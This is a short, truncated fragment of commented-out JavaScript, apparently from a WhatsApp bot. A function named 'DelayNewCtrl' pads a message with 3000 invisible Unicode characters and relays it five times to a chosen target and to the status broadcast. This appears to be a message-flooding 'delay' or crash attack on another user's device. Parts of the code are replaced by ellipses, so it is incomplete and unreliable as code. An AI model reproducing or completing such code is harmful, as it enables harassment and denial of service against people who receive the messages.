...
/*async function DelayNewCtrl(conn, target) {
const p = "\u2060".repeat(3000);
    ...
    for (let i = 0; i < 5; i++) {
        ...
        await conn.relayMessage(target, waMsg.message, { messageId: waMsg.key.id });

        await conn.relayMessage("status@broadcast", waMsg.message, {
